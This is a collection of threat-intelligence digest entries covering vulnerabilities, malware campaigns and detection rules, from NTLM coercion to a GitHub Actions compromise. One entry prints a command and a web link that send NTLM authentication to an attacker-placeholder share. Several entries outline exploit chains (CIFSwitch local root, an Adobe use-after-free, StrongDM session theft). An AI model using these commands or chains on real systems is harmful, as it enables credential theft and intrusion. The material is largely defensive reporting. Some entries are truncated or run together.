item.title: Unpatched NTLM Coercion in Windows search: URI Handler, Same Bug, No CVE, No Fix
item.description:
Microsoft 🇺🇸 patches NTLM coercion in Snipping Tool but leaves identical bug unfixed in Windows search handler. Same technique, same impact, different policy outcome exposes inconsistent vulnerability management.
Key technical details: • search: URI handler accepts crumb=location: parameter pointing to UNC paths without validation • Triggers automatic NTLM authentication, leaking Net-NTLMv2 hashes to attacker-controlled SMB shares • Works via command line: start "" "search:query=test&crumb=location:\\attacker[.]ip\share" • Also exploitable through web links: <a href="search:query=test&crumb=location:\\attacker[.]ip\share"> • Both search: and search-ms: handlers use same COM class (CLSID {90b9bce2-b6db-4fd3-8451-35917ea1081b}) in ExplorerFrame.dll
Attack methodology: • Single click triggers immediate hash leak before error dialog appears • First invocation per user session captures credentials; subsequent attempts fail until re-login • No malware required - abuses built-in Windows authentication behavior • Captured hashes useful for relay attacks or offline cracking depending on environment

item.title: The HazyBeacon Protocol – How Malware Weaponizes Amazon Web Services (AWS) Lambda Function URLs
item.description:

Technical breakdown: • Malware communicates with Lambda Function URLs configured as AuthType: NONE, creating public HTTPS endpoints on trusted on.aws domains • Attack chain: credential theft → Lambda deployment via legitimate APIs → C2 relay through aws-lambda-url endpoints • Maps to T1078.004 (cloud accounts), T1648 (serverless execution), T1102 (web service C2), T1090 (proxy) • Functions deployed in low-scrutiny regions (sa-east-1, eu-north-1) with benign names like "UpdateWorker" • Command relay generates near 1:1 inbound/outbound request ratio, processing thousands of C2 requests hourly
Defense: Implement SCPs restricting AuthType: NONE Lambda URLs, enable global CloudTrail logging, monitor Lambda cost anomalies, and hunt for suspicious aws sts get-caller-identity API calls followed by lambda:CreateFunction activity.

item.title: From Conti to The Gentlemen: tooling evolved, gaps didn't. by Lucie Cardiet
item.description:
Four years of ransomware operator leaks reveal groups rebrand constantly but use identical attack methods. Same operators, same gaps: edge authentication, browser credentials, NTDS.dit theft, hypervisor blindspots, and rclone exfiltration.
Key findings from Conti (2022) to The Gentlemen (2026): • Operator "Tinker" maintained negotiator role across Conti→Black Basta→The Gentlemen, using shared Matrix homeserver bestflowers247[.]online • Primary access: CVE-2024-3400 (PAN-OS), CVE-2024-55591 (FortiGate), CVE-2025-32433 (Erlang SSH RCE) - edge appliances remain the front door • Browser credential theft via Phemedrone Stealer, LummaC2, Chrome App-Bound Encryption tools post-authentication • NTDS.dit extraction from VSS backups still delivers full domain compromise in 2026 • Hypervisor-level encryption (Hyper-V Volume Manager) bypasses guest EDR completely • Standard exfil chain unchanged: rclone→staging NAS→MEGA cloud storage
Evolution: AI now handles negotiations and victim contact automation. Custom C2 frameworks replaced Cobalt Strike. EDR bypass costs ~$5K.
Hunt for rclone/MEGAcmd/Velociraptor on unexpected hosts. Treat NTDS.dit access as Sev-1, not forensic finding. Deploy hypervisor-level monitoring.

item.title: From Fake Purchase Orders to Remote Access: Analyzing the JS.MonoGlyphRAT Threat to US Enterprises
item.description:

Technical breakdown: • Monoglyph obfuscation using repeated mixed-case characters (IiIiIiIiiIII, KkkKKKkKkK) in function/variable names • Persistence via HKCU\Software\Microsoft\Windows\CurrentVersion\Run + self-copy to %USERPROFILE% • C2 communication over HTTP using X-S (session ID) and X-A (command) headers on non-standard ports • AES-128-CBC encrypted PowerShell payloads with static IV "sixteenbyteslong" • AMSI bypass via AmsiScanBuffer patching for .NET reflective loading (T1562.001, T1620)
Attack chain: • Initial access via phishing with .js files mimicking business documents (T1204.002) • Execution through wscript.exe → PowerShell stagers (T1059.007, T1059.001) • WMI-based system discovery collecting hardware/software inventory (T1082, T1057) • Command capabilities include file execution, shell access, payload download, client updates
Primary targets: US 🇺🇸 technology sector, MSSPs, telecommunications, education. Also observed in Germany 🇩🇪, Sweden 🇸🇪, Australia 🇦🇺.
IOCs: C2 IPs 158[.]94[.]211[.]76, 91[.]92[.]243[.]79 | Domain scan[.]aryamint[.]com

item.description:

Key technical details: • Malware uses 6 invisible Unicode chars (U+200C, U+200D, U+2061-2064) embedded in Steam comments that appear as ASCII art • Decoding: strips visible chars → maps invisible chars to 0-5 → converts to binary → applies bitwise NOT → optional AES-256-CTR encryption • Payload fetches malicious JS from hello-mywordl[.]info masquerading as lodash.core.min.js library • Backdoor listens for cookies DEpjndDbNc (ping) and tEcaKKXEsb (code execution via base64 POST parameter new_code)
Attack persistence: • JavaScript injected via wp_enqueue_scripts hook with handle "asahi-jquery-min-bundle" • Self-updating capability overwrites plugin/theme files with new malicious code • Survives partial cleanup - can reinstall removed components through backdoor

item.title: The KQL Query That Caught 260 Brute Force Attempts in Microsoft Sentinel
item.description:
Custom KQL rule in Microsoft Sentinel successfully caught 260 SSH brute force attempts across 3 attack waves in 28 minutes. Rate-based detection prevented alert fatigue while maintaining 100% detection accuracy.
Technical breakdown: • Rule queries Syslog table filtering authpriv facility for "Failed password" and "authentication failure" messages • Uses bin(TimeGenerated, 5m) to aggregate events into 5-minute windows, counting failures per timeframe • Threshold set at >10 failures per 5-minute window to distinguish automated attacks from legitimate user errors • Maps to MITRE T1110.001 (Brute Force: Password Guessing) with High severity auto-incident generation • Attack sourced from 10.0.0.100 targeting Ubuntu server with zero successful authentications
Key detection logic: ``` Syslog | where Facility == "authpriv" | where SyslogMessage contains "Failed password" or SyslogMessage contains "authentication failure" | summarize FailedAttempts = count() by Computer, HostName, bin(TimeGenerated, 5m) | where FailedAttempts > 10 ```
Hunt for similar patterns using rate-based aggregation instead of per-event alerting. This approach reduces noise while maintaining detection fidelity for automated attacks.

item.title: 32 Red Hat npm packages backdoored in 72 seconds
item.description:

Includes worm propagation capability to publish additional poisoned packages using stolen npm credentials • DFIR artifacts: Unique SHA-256 per package (individualized AES keys/IVs defeat hash deduplication), preinstall script execution during npm install, outbound HTTPS from Node.js during package installation • Timeline: June 1, 2026 10:54:09-10:55:21 UTC. item.title: Adobe Acrobat Reader Escript.api Use-After-Free Remote Code Execution
item.description:
Adobe Reader Escript.api use-after-free enables RCE via JavaScript prototype pollution. Affects 32/64-bit versions through 25.001.21288, patched April 2026 with CVE-2026-34621/34622/34626.
Technical breakdown: • Vulnerability in Escript.api module through __defineGetter__() on Collab.toString property • Recursive calls exhaust C++ stack without triggering JS recursion limits, creating exception handler frame accumulation • Two independent bookkeeping systems (reference counting + event scope stack) fall out of sync during stack overflow • push_event_scope_and_resolve() never reaches cleanup code, leaving dangling pointer in scope stack while reference counter hits zero
Attack chain: • Override Collab.toString via __defineGetter__() to create recursive execution pattern • util.scand() triggers push_event_scope_and_resolve(), creating scoped object in event scope stack • Stack overflow prevents proper cleanup - scope stack entry persists while object reference counter decremented • Garbage collection frees object, scope stack retains dangling pointer • Subsequent access via removeField() triggers use-after-free
Exploitation methods: • 32-bit: Heap spray ArrayBuffers, reclaim freed object with ReadStream, gain OOB R/W, leak module bases, ROP chain to VirtualProtect • 64-bit: Requires PartitionAlloc bypass for arbitrary R/W primitive

item.title: Re: CIFSwitch: Linux kernel/cifs-utils local root via forged cifs.spnego upcall
item.description:
CVE-2026-46243: CIFSwitch exploit enables unprivileged users to gain root access on Linux systems through forged CIFS SPNEGO upcalls. Affects wide range of distributions including Ubuntu, Debian, SUSE, and enterprise distros.
Technical details: • Exploitation requires cifs-utils installed + CIFS kernel module loadable + unprivileged namespaces enabled • Attacker calls request_key("cifs.spnego",...) with forged description containing malicious pid/uid/creduid fields • cifs.upcall runs as root, trusts attacker-supplied data, switches into malicious mount namespace • Private namespace with controlled /etc/nsswitch.conf and libnss_*.so.2 achieves root code execution
Attack chain: • User creates private mount namespace with weaponized NSS configuration files • Triggers request_key() with forged SPNEGO description pointing to malicious namespace • Root helper cifs.upcall performs NSS lookup in attacker-controlled environment • Malicious shared libraries execute with root privileges before privilege drop
DFIR artifacts: • Monitor for unusual request_key syscalls with "cifs.spnego" type from unprivileged processes • Check /proc/*/ns/mnt for suspicious private mount namespaces • Audit /etc/nsswitch.conf modifications and non-standard libnss_*.so.2 libraries
Immediate mitigations: Block CIFS module loading, override /etc/request-key.d/cifs.spnego.conf rule, or disable unprivileged namespaces. Kernel fix queued for stable releases.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2061523816472318066

item.title: CVE-2026-4387: StrongDM State File Reuse
item.description:
CVE-2026-4387: Critical StrongDM flaw allowed attackers to steal and reuse authentication state files across hosts for persistent access. Plaintext JWT and key pairs in user directories enabled session hijacking without credential theft.
Key technical details: • Vulnerable path: C:\Users\<username>\.sdm\state.kv contained JWT + RSA key pairs in plaintext • Attack vector: Copy state.kv between hosts, replace victim's file, gain authenticated access to infrastructure • Required permissions: User-level access only (no admin rights needed) • Affected versions: All prior to Desktop 23.74.0 and CLI 53.77.0 • Local endpoint http://127.0.0.1:65220/v2/authentication leaked JWTs with simple no-cors header
Attack methodology: • Exfiltrate state.kv from authenticated user's workstation • Deploy on attacker-controlled host with StrongDM installed • Replace local state file after application launch for higher success rate • Automatic session refresh provides full access to victim's StrongDM resources
DFIR artifacts: • Monitor file access to .sdm\state.kv via Process Monitor or Sysmon Event ID 11 • Check for unusual StrongDM CLI connections from non-standard hosts/IPs • Audit authentication logs for sessions from unexpected geographic locations
Hunt for recent state.kv file modifications and cross-reference with StrongDM process execution outside normal user patterns.

Key technical details: • Base64-encoded malicious scripts injected into GitHub Actions YAML files starting May 18, 2026 • Primary C2: hxxp[://]216[.]126[.]225[.]129:8443 (RouterHosting LLC, ASN 14956) • Exfiltrated data stored in "/loot" directory on C2 server with "gh_dump" parameter indicating GitHub targeting • Historical C2 activity traced to May 8 campaign using hxxp[://]144[.]172[.]116[.]48:8080 with "cp2[.]hostable[.]com" campaign identifier
Attack methodology: • Compromise of CI/CD pipelines through GitHub Actions (T1195.001) • Credential harvesting from compromised repositories • Infrastructure reuse linking current campaign to previous cryptomining operations • C2 response content reveals operational parameters and file structure
DFIR artifacts include base64-encoded YAML configurations in .github/workflows/, network connections to identified C2 IPs, and POST requests with specific query parameters (h=, l=, id=, t=).
Hunt for GitHub Actions with base64 content and outbound connections to RouterHosting infrastructure. Full YARA rule and IOC list provided in the analysis.
